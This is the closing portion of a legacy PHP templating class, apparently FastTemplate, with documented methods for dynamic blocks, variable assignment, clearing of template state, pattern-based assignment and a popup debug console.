 * This tells FastTemplate that buried in the ``table'' template is a dynamic block, named ``row''. In older verions of FastTemplate (pre 0.7) this ``row'' template would have been defined as it's own file. Here's how a dynamic block appears within a template file;
 *
 *
 * <code>
 * <!-- NAME: dynamic.html -->
 *  <table>
 *  <!-- BEGIN DYNAMIC BLOCK: row -->
 *  <tr>
 *   <td>{NUMBER}</td>
 *   <td>{BIG_NUMBER}</td>
 *  </tr>
 *  <!-- END DYNAMIC BLOCK: row -->
 * </table>
 * <!-- END: dynamic.html -->
 *
 * </code>
 *
 * The syntax of your BEGIN and END lines needs to be VERY exact. It is case sensitive. The code block begins on a new line all by itself. There cannot be ANY OTHER TEXT on the line with the BEGIN or END statement. (although you can have any amount of whitespace before or after) It must be in the format shown: <br>
 * <b><!-- BEGIN DYNAMIC BLOCK: handle_name --></b> <br>
 * The line must be exact, right down to the spacing of the characters. The same is true for your END line. The BEGIN and END lines cannot span multiple lines. Now when you call the parse() method, FastTemplate will automatically spot the dynamic block, strip it out, and use it exactly as if you had defined it as a stand-alone template. No additional work is required on your part to make it work - just define it, and FastTemplate will do the rest. Included with this archive should have been a file named define_dynamic.phtml which shows a working example of a dynamic block.<br>
 * There are a few rules when using dynamic blocks - dynamic blocks should not be nested inside other dynamic blocks - strange things WILL occur. You -can- have more than one nested block of code in a page, but of course, no two blocks can share the same defined handle. The error checking for define_dynamic() is miniscule at best. If you define a dynamic block and FastTemplate fails to find it, no errors will be generated, just really weird output. (FastTemplate will not append the dynamic data to the retured output) Since the BEGIN and END lines are stripped out of the parsed results, if you ever see your BEGIN or END line in the parsed output, that means that FastTemplate failed to find that dynamic block.
 *
 * @param input Macro Name
 * @param input Parent Name
*/
    function define_dynamic ($Macro, $ParentName)
    {
        //  A dynamic block lives inside another template file.
        //  It will be stripped from the template when parsed
        //  and replaced with the {$Tag}.

        $this->DYNAMIC["$Macro"] = $ParentName;
        return true;
    }
//  ************************************************************

/**
 *
 * @access private
*/
    function parse_dynamic ($Macro,$MacroName)
    {
        // The file must already be in memory.
        //echo "parse_dynamic $Macro::$MacroName";
        $ParentTag = $this->DYNAMIC["$Macro"];
        if( (!isset($this->$ParentTag)) or (empty($this->$ParentTag)) )
        {
            $fileName = $this->FILELIST[$ParentTag];
            $this->$ParentTag = $this->get_template($fileName);
            $this->LOADED[$ParentTag] = 1;
        }
        if($this->$ParentTag)
        {
            $template = $this->$ParentTag;
            $DataArray = split("\n",$template);
            $newMacro = "";
            $newParent = "";
            $outside = true;
            $start = false;
            $end = false;
            while ( list ($lineNum,$lineData) = each ($DataArray) )
            {
                $lineTest = trim($lineData);
                if("<!-- BEGIN DYNAMIC BLOCK: $Macro -->" == "$lineTest" )
                {
                    $start = true;
                    $end = false;
                    $outside = false;
                }
                if("<!-- END DYNAMIC BLOCK: $Macro -->" == "$lineTest" )
                {
                    $start = false;
                    $end = true;
                    $outside = true;
                }
                if( (!$outside) and (!$start) and (!$end) )
                {
                    $newMacro .= "$lineData\n"; // Restore linebreaks
                }
                if( ($outside) and (!$start) and (!$end) )
                {
                    $newParent .= "$lineData\n"; // end Restore linebreaks
                }
                if($end)
                {
                    $newParent .= '{'."$MacroName}\n";
                }
                // Next line please
                if($end) { $end = false; }
                if($start) { $start = false; }
            }   // end While

            $this->$Macro = $newMacro;
            $this->$ParentTag = $newParent;
            return true;

        }   // $ParentTag NOT loaded - MAJOR oopsie
        else
        {
            @error_log("ParentTag: [$ParentTag] not loaded!",0);
            $this->error("ParentTag: [$ParentTag] not loaded!",0);
        }
        return false;
    }

//  ************************************************************
/**
 * Strips a dynamic block from a template.
 *
 * This provides a method to remove the dynamic block definition from the parent macro provided that you haven't already parsed the template. Using our example above:
 *
 * <code>
 * $tpl->clear_dynamic("row");
 * </code>
 *
 * Would completely strip all of the unparsed dynamic blocks named ``row'' from the parent template. This method won't do a thing if the template has already been parsed! (Because the required BEGIN and END lines have been removed through the parsing) This method works well when you are accessing a database, and your ``rows'' may or may not return anything to print to the template. If your database query doesn't return anything, you can now strip out the rows you've set up for the results.
 *
 * @param input Macro name
 */
    function clear_dynamic ($Macro="")
    {
        if(empty($Macro)) { return false; }

        // The file must already be in memory.

        $ParentTag = $this->DYNAMIC["$Macro"];

        if( (!$this->$ParentTag) or (empty($this->$ParentTag)) )
        {
            $fileName = $this->FILELIST[$ParentTag];
            $this->$ParentTag = $this->get_template($fileName);
            $this->LOADED[$ParentTag] = 1;
        }

        if($this->$ParentTag)
        {
            $template = $this->$ParentTag;
            $DataArray = split("\n",$template);
            $newParent = "";
            $outside = true;
            $start = false;
            $end = false;
            while ( list ($lineNum,$lineData) = each ($DataArray) )
            {
                $lineTest = trim($lineData);
                if("<!-- BEGIN DYNAMIC BLOCK: $Macro -->" == "$lineTest" )
                {
                    $start = true;
                    $end = false;
                    $outside = false;
                }
                if("<!-- END DYNAMIC BLOCK: $Macro -->" == "$lineTest" )
                {
                    $start = false;
                    $end = true;
                    $outside = true;
                }
                if( ($outside) and (!$start) and (!$end) )
                {
                    $newParent .= "$lineData\n"; // Restore linebreaks
                }
                // Next line please
                if($end) { $end = false; }
                if($start) { $start = false; }
            }   // end While

            $this->$ParentTag = $newParent;
            return true;

        }   // $ParentTag NOT loaded - MAJOR oopsie
        else
        {
            @error_log("ParentTag: [$ParentTag] not loaded!",0);
            $this->error("ParentTag: [$ParentTag] not loaded!",0);
        }
        return false;
    }
//  *******************************************************
/**
 *
 *The method define() maps a template filename to a (usually shorter) name;
 *   <code>
 *   $tpl = new FastTemplate("/path/to/templates");
 *   $tpl->define( array(    main    => "main.html", footer  => "footer.html" ));
 *   </code>
 * This new name is the name that you will use to refer to the templates. Filenames should not appear in any place other than a define().<br>
 * (Note: This is a required step! This may seem like an annoying extra step when you are dealing with a trivial example like the one above, but when you are dealing with dozens of templates, it is very handy to refer to templates with names that are indepandant of filenames.)<br>
 * TIP: Since define() does not actually load the templates, it is faster and more legible to define all the templates with one call to define(). <br>
 *
*/
    function define ($fileList, $value=null)
    {
        if ((gettype($fileList)!="array") && !is_null($value)) $fileList = array($fileList => $value); //added by Voituk Vadim
        while ( list ($FileTag,$FileName) = each ($fileList) )
        {
            $this->FILELIST["$FileTag"] = $FileName;
        }
        return true;
    }

//  ************************************************************
/**
 * Does the same thing as the clear() function
 * @see clear()
 */
    function clear_parse ( $ReturnVar = "")
    {
        $this->clear($ReturnVar);
    }
//  ************************************************************
/**
 * Clears the internal references that store data passed to parse().
 *
 * clear() accepts individual references, or array references as arguments.
 *
 * Note: All of the clear() functions are for use anywhere where your scripts are persistant. They generally aren't needed if you are writing CGI scripts.
 *
 * Often clear() is at the end of a script:
 *
 *<code>
 *$tpl->FastPrint("MAIN");
 *$tpl->clear("MAIN");
 *</code>
 *or
 *<code>
 *$tpl->FastPrint("MAIN");
 *$tpl->FastPrint("CONTENT");
 *$tpl->clear(array("MAIN","CONTENT"));
 *</code>
 *If called with no arguments, removes ALL references that have been set via parse().

 */
    function clear ( $ReturnVar = "" )
    {


        if(!empty($ReturnVar))
        {
            if( (gettype($ReturnVar)) != "array")
            {
                unset($this->$ReturnVar);
                return;
            }
            else
            {
                while ( list ($key,$val) = each ($ReturnVar) )
                {
                    unset($this->$val);
                }
                return;
            }
        }

        // Empty - clear all of them

        while ( list ( $key,$val) = each ($this->HANDLE) )
        {
            $KEY = $key;
            unset($this->$KEY);
        }
        return;

    }   //  end clear()

//  ************************************************************
/**
 *Cleans the module of any data, except for the ROOT directory.
 *
 *This is equivalent to:
 *
 *<code>
 *$tpl->clear_define();
 *$tpl->clear_href();
 *$tpl->clear_tpl();
 *$tpl->clear_parse();
 *</code>
 */
    function clear_all ()
    {
        $this->clear();
        $this->clear_assign();
        $this->clear_define();
        $this->clear_tpl();

        return;

    }   //  end clear_all
//  ************************************************************
/**
 *Clears the internal array that stores the contents of the templates (if they have been loaded)
 *
 *If you are having problems with template changes not being reflected, try adding this method to your script.
 *<code>
 *$tpl->define(MAIN,"main.html" );
 * ( assign(), parse() etc etc...)
 *$tpl->clear_tpl(MAIN);    // Loaded template now unloaded.
 *</code>
 */
    function clear_tpl ($fileHandle = "")
    {
        if(empty($this->LOADED))
        {
            // Nothing loaded, nothing to clear

            return true;
        }
        if(empty($fileHandle))
        {
            // Clear ALL fileHandles

            while ( list ($key, $val) = each ($this->LOADED) )
            {
                unset($this->$key);
            }
            unset($this->LOADED);

            return true;
        }
        else
        {
            if( (gettype($fileHandle)) != "array")
            {
                if( (isset($this->$fileHandle)) || (!empty($this->$fileHandle)) )
                {
                    unset($this->LOADED[$fileHandle]);
                    unset($this->$fileHandle);
                    return true;
                }
            }
            else
            {
                while ( list ($Key, $Val) = each ($fileHandle) )
                {
                    unset($this->LOADED[$Key]);
                    unset($this->$Key);
                }
                return true;
            }
        }

        return false;

    }   // end clear_tpl
//  ************************************************************
/**
 *Clears the internal list that stores data passed to:
 *<kbd>
 *$tpl->define();
 *</kbd>
 *
 *Note: The hash that holds the loaded templates is not touched with this method. ( See: clear_tpl() ) Accepts a single file handle, an array of file handles, or nothing as arguments. If no argument is given, it clears ALL file handles.
 *
 *<code>
 *$tpl->define( array( MAIN => "main.html",
 *BODY => "body.html", FOOT => "foot.html"  ));
 *(some code here)
 *$tpl->clear_define("MAIN");
 *</code>
 *
 */
    function clear_define ( $FileTag = "" )
    {
        if(empty($FileTag))
        {
            unset($this->FILELIST);
            return;
        }

        if( (gettype($Files)) != "array")
        {
            unset($this->FILELIST[$FileTag]);
            return;
        }
        else
        {
            while ( list ( $Tag, $Val) = each ($FileTag) )
            {
                unset($this->FILELIST[$Tag]);
            }
            return;
        }
    }
//        ************************************************************
/*        Aliased function - used for compatibility with CGI::FastTemplate
//GRAFX     REMOVED because a lot of problem was caused on different servers.
        function clear_parse ()
        {
                $this->clear_assign();
        }
*/
//  ************************************************************
/**
 * Clears all variables set by assign()
 */
    function clear_assign ()
    {
        if(!(empty($this->PARSEVARS)))
        {
            while(list($Ref,$Val) = each ($this->PARSEVARS) )
            {
                unset($this->PARSEVARS["$Ref"]);
            }
        }
    }
//  ************************************************************
/**
 * Removes a given reference from the list of refs that is built using:
 * <kbd>
 *$tpl->assign(KEY = val);
 *</kbd>
 *
 *If it's called with no arguments, it removes all references from the array.
 *
 *<code>
 *$tpl->assign(    array(    MOVIE  =>  "The Avengers", RATE   =>  "BadMovie"    ));
 *$tpl->clear_href("MOVIE"); // Now only {RATE} exists in the assign() array
 *</code>
 *
 */
    function clear_href ($href)
    {
        if(!empty($href))
        {
            if( (gettype($href)) != "array")
            {
                unset($this->PARSEVARS[$href]);
                return;
            }
            else
            {

                foreach ($href as $value)
                    unset($this->PARSEVARS[$value]);

                return;
            }
        }
        else
        {
            // Empty - clear them all
            $this->clear_assign();
        }
        return;
    }
//  ************************************************************
        /**/

    /**
    * assign template variables with the same names from array by specfied keys
    * NOTE: template variables will be in upper case
     by Voituk Vadim
    */
    function assign_from_array($Arr, $Keys) {
            if (gettype($Arr) == "array") {
                foreach ($Keys as $k)
                    if (!empty($k))
                        $this->PARSEVARS[strtoupper($k)] =  str_replace('&amp;#', '&#', $Arr[strtolower($k)]);
            }
        }
/**
 * Assign variables
 *
 * This method assigns values for variables. In order for a variable in a template to be interpolated it must be assigned. There are two forms which have some important differences. The simple form, is to accept an array and copy all the key/value pairs into an array in FastTemplate. There is only one array in FastTemplate, so assigning a value for the same key will overwrite that key.
 *
 * <code>
 * $tpl->assign(TITLE    => "king kong");
 * $tpl->assign(TITLE    => "gozilla");    // overwrites "king kong"
 * </code>
 *
 */
    function assign ($ft_array, $trailer="")
    {
        if(gettype($ft_array) == "array")
        {
            while ( list ($key,$val) = each ($ft_array) )
            {
                if (!(empty($key)))
                {
                    //  Empty values are allowed
                    //  Empty Keys are NOT

                    // ORIG $this->PARSEVARS["$key"] = $val;
                    if (!is_object($val)) $this->PARSEVARS["$key"] =  str_replace('&amp;#', '&#', $val);  //GRAFX && Voituk
                        else $this->PARSEVARS["$key"] =  $val;  //GRAFX && Voituk
                }
            }
        }
        else
        {
            // Empty values are allowed in non-array context now.
            if (!empty($ft_array))
            {
                // ORIG $this->PARSEVARS["$ft_array"] = $trailer;
                if (!is_object($trailer)) $this->PARSEVARS["$ft_array"] = str_replace('&amp;#', '&#', $trailer); //GRAFX
                    else $this->PARSEVARS["$ft_array"] =  $trailer;  //GRAFX && Voituk
            }
        }
    }
//  ************************************************************
//  Christian Brandel cbrandel@gmx.de
/**
 *Return the value of an assigned variable.
 *
 *This method will return the value of a variable that has been set via assign(). This allows you to easily pass variables around within functions by using the FastTemplate class to handle ``globalization'' of the variables.
 *
 *For example:
 *
 * <code>
 * $tpl->assign(  array(  TITLE    =>    $title,
 * BGCOLOR  =>    $bgColor, TEXT     =>    $textColor ));
 * $bgColor = $tpl->get_assigned(BGCOLOR);
 * </code>
 */
    function get_assigned($ft_name = "")
    {
        if(empty($ft_name)) { return false; }
        if(isset($this->PARSEVARS["$ft_name"]))
        {
            return ($this->PARSEVARS["$ft_name"]);
        }
        else
        {
            return false;
        }
    }
//  ************************************************************
/**
 * Put an error message and stop (if requested)
 *
 *@param string
 *@param bool
*/
    function error ($errorMsg, $die = 0)
    {
        $this->ERROR = $errorMsg;
        echo "ERROR: $this->ERROR <BR> \n";
        if ($die == 1)
        {
            exit;
        }

        return;

    } // end error()

//  ************************************************************
    /**
     author GRAFX - www.grafxsoftware.com,since 1.1.3
     * Pattern Assign
     *
     * Pattern Assign - when variables or constants are the same as the
     * template keys, these functions may be used as they are. Using
     * these functions, can help you reduce the number of
     * the assign functions in the php files
     *
     * Useful for language files where all variables or constants have
     * the same prefix.i.e. <i>$LANG_SOME_VAR</i> or <i>LANG_SOME_CONST</i><br>
     * The $pattern is <i>LANG</i> in this case.
     */
             function multiple_assign($pattern)
                {
                        while(list($key,$value) = each($GLOBALS))
                        {
                            if (substr($key,0,strlen($pattern))==$pattern)
                            {
                                $this->assign(strtoupper($key),$value);
                            }
                        }
                        reset($GLOBALS);
                } // multiple_assign
    /**
     * Same as multiple_assign(), but for constants (defines)
     */
            function multiple_assign_define($pattern)
                {
                    $ar=get_defined_constants();
                    foreach ($ar as $key => $def)
                      if (substr($key,0,strlen($pattern))==$pattern)
                            $this->assign(strtoupper($key),$def);
                }    // multiple_assign_define

//  ************************************************************

  /**
     * @author GRAFX - www.grafxsoftware.com
     * @very helpful when we want to run some filter bofore the tamplate is parsed
     */
             function pre_filter($pattern,$replace)
                {
                        $this->PRE_FILTER[0]=$pattern;
                        $this->PRE_FILTER[1]=$replace;
                } // pre_filter


//  ************************************************************
    /**
     *  Prints debug info into console
     * @return void
     * @author AiK
     * @since 1.1.1
     * modified by GRAFX, added 2 Levels of debugging.
     * Level 1 is showing all info + added WARNINGS
     * Level 2 will popup the window only if WARNINGS are present,
     * very helpfull only when you want to see BUGS on your page
     */

    function showDebugInfo($Debug_type=null){
        $tm =  $this->utime()  - $this->start;
        if($Debug_type != null )
        if($Debug_type==1)
        {
                    // print time
                    print "
                    <SCRIPT language=javascript>
                    _debug_console = window.open(\"\",\"console\",\"width=500,height=420,resizable,scrollbars=yes, top=0 left=130\");
                    _debug_console.document.write('<html><title>Debug Console</title><body bgcolor=#ffffff>');
                    _debug_console.document.write('<h3>Debugging info: generated during $tm seconds</h3>');
                    ";


                    if($this->STRICT_DEBUG)
                    $this->printarray($this->WARNINGS, "Warnings");

                            $this->printarray($this->FILELIST, "Templates");
                    $this->printarray($this->DYNAMIC, "Dynamic bloks");
                    $this->printarray($this->PARSEVARS, "Parsed variables");

                    print " _debug_console.document.close();
                   </SCRIPT> ";
        }
        else
        if($Debug_type==2)
                     {
                        if($this->STRICT_DEBUG && sizeof($this->WARNINGS)!=0)
                        {
                        // print time
                            print "
                            <SCRIPT language=javascript>
                            _debug_console = window.open(\"\",\"console\",\"width=500,height=420,resizable,scrollbars=yes, top=0 left=130\");
                            _debug_console.document.write('<html><title>Debug Console</title><body bgcolor=#ffffff>');
                            _debug_console.document.write('<h3>Debugging info: generated during $tm seconds</h3>');
                            ";


                                  $this->printarray($this->WARNINGS, "Warnings");

                           print " _debug_console.document.close();
                           </SCRIPT> ";
                        }
                     }
    }//end of showDebugInfo()

    /**
     *
     */
     function printarray($arr,$caption){
     if (count($arr)!=0){
        print "
        _debug_console.document.write('<font face=Tahoma color=#0000FF size=2><b>$caption</b> </font>');\n
        _debug_console.document.write('<table border=0 width=100%  cellspacing=1 cellpadding=2>');
        _debug_console.document.write('<tr bgcolor=#CCCCCC><th width=175>key</th><th>value</th></tr>');\n ";

        $flag=true;
         while ( list ($key,$val) = each ($arr) ){
         $flag=!$flag;
             $val=htmlspecialchars(mysql_escape_string ($val));
         if (!$flag) {
            $color ="#EEFFEE";
         }else{
            $color ="#EFEFEF";
         }
            print "_debug_console.document.write('<tr bgcolor=$color><td> $key</td><td valign=bottom><pre>$val</pre></td></tr>');\n ";
         }
        print "_debug_console.document.write(\"</table>\");";
        }
     } //
//  ************************************************************

 /**
     * Pattern Assign
     *
     * Pattern Assign - this is an extension of the earlier pattern assign.
     * The main advantage is that this way we can deal with pattern assign in dinamic
     * parts too.
     * The old version is still ok keeping the backward compatibility but the new strategy
     * is a global assignement of the patterns.
     *
     * First we should initialize the pattern arrays with setPattern
     * @param $pattern can be array or just a simple string which contains the patterns
     * @param $type $type = 1 we have defines, $type = 0(or any other number) we have vars; default is 1(defines)
     * @author Zoltan Elteto
     * @very helpful to initialize all the patterns.initialization can be made for defines or       variables,
     * but not both on the same time.
     * Ex: $this->setPattern("LANG_"); would apply for all defines begining with LANG_
     *     $this->setPattern(array("LANG_","CONF_")); it is the same only we use 2 patterns now LANG_ and CONF_
     *     The variable part is simple, too.
     *     $this->setPattern("conf_",0);
     **/
     function setPattern($pattern,$type=1){

    /*
      $type = 1 we have defines
      $type = 0(or any other number) we have vars

    */
      if(is_array($pattern))
        {
          foreach($pattern as $value)
            if($type)
              $this->PATTERN_VARS_DEFINE["$value"]="$value";
            else
              $this->PATTERN_VARS_VARIABLE["$value"]="$value";

        }
        else
          if($type)
              $this->PATTERN_VARS_DEFINE["$pattern"]="$pattern";
            else
              $this->PATTERN_VARS_VARIABLE["$pattern"]="$pattern";

     }
    /**
     * @author Zoltan Elteto
     * @very just clean up all patterns
     **/
     function emptyPattern(){

     $this->PATTERN_VARS_DEFINE[]=array();
     $this->PATTERN_VARS_VARIABLE[]=array();

     }

    /**
     * @author Zoltan Elteto
     * @param $pattern can be array or just a simple string which contains the patterns
     * @param $type $type = 1 we have defines, $type = 0(or any other number) we have vars; default is 1(defines)
     * @very delete the specified pattern
     **/
     function deletePattern($pattern,$type=1){

      if($type)
        unset($this->PATTERN_VARS_DEFINE["$pattern"]);
      else
        unset($this->PATTERN_VARS_VARIABLE["$pattern"]);


     }


//  ************************************************************
} // End cls_fast_template.php
}// end of if defined



// End cls_fast_template.php
?>